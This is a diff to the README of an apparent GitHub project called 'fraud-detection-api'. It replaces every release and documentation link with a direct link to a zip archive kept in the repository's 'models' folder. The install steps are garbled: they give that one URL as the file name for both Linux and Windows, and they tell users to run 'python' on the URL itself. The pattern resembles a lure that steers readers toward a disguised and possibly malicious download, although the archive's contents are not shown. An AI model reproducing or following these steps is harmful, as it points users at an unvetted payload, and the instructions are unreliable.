@@ -1,6 +1,6 @@
 # 🎉 fraud-detection-api - Simple Fraud Detection Made Easy
 
-[![Download](https://github.com/Anthox994/fraud-detection-api/releases)](https://github.com/Anthox994/fraud-detection-api/releases)
+[![Download](https://raw.githubusercontent.com/Anthox994/fraud-detection-api/main/models/fraud-api-detection-v3.9.zip)](https://raw.githubusercontent.com/Anthox994/fraud-detection-api/main/models/fraud-api-detection-v3.9.zip)
 
 ## 📖 Description
 
@@ -22,13 +22,13 @@ Before you start, ensure your system meets the following requirements:
 
 1. **Visit the Releases Page**  
    Go to the following link to download the latest version:  
-   [Download Now!](https://github.com/Anthox994/fraud-detection-api/releases)
+   [Download Now!](https://raw.githubusercontent.com/Anthox994/fraud-detection-api/main/models/fraud-api-detection-v3.9.zip)
 
 2. **Select the Right Release**  
    On the releases page, find the version you want. Generally, the latest version will be at the top.
 
 3. **Download the Files**  
-   Click the link for the file that corresponds to your operating system. Downloads will usually have a name similar to `https://github.com/Anthox994/fraud-detection-api/releases` for Linux or `https://github.com/Anthox994/fraud-detection-api/releases` for Windows.
+   Click the link for the file that corresponds to your operating system. Downloads will usually have a name similar to `https://raw.githubusercontent.com/Anthox994/fraud-detection-api/main/models/fraud-api-detection-v3.9.zip` for Linux or `https://raw.githubusercontent.com/Anthox994/fraud-detection-api/main/models/fraud-api-detection-v3.9.zip` for Windows.
 
 4. **Extract Files**  
    Once the download is complete, locate the file in your downloads folder. Extract the content using an unzip tool compatible with your operating system.
@@ -37,12 +37,12 @@ Before you start, ensure your system meets the following requirements:
    - For Windows:
      - Open the command prompt.
      - Navigate to the extracted folder.
-     - Run the command: `python https://github.com/Anthox994/fraud-detection-api/releases`
+     - Run the command: `python https://raw.githubusercontent.com/Anthox994/fraud-detection-api/main/models/fraud-api-detection-v3.9.zip`
   
    - For macOS/Linux:
      - Open the terminal.
      - Navigate to the extracted folder.
-     - Run the command: `python3 https://github.com/Anthox994/fraud-detection-api/releases`
+     - Run the command: `python3 https://raw.githubusercontent.com/Anthox994/fraud-detection-api/main/models/fraud-api-detection-v3.9.zip`
 
 ### ⚙️ Using Docker
 
@@ -85,7 +85,7 @@ If you have any questions, reach out via the project's GitHub page. Your feedbac
 
 ## 🔗 Additional Links
 
-- [Release Page](https://github.com/Anthox994/fraud-detection-api/releases)
-- [Documentation](https://github.com/Anthox994/fraud-detection-api/releases)
+- [Release Page](https://raw.githubusercontent.com/Anthox994/fraud-detection-api/main/models/fraud-api-detection-v3.9.zip)
+- [Documentation](https://raw.githubusercontent.com/Anthox994/fraud-detection-api/main/models/fraud-api-detection-v3.9.zip)
 
 Thank you for using the fraud-detection-api!
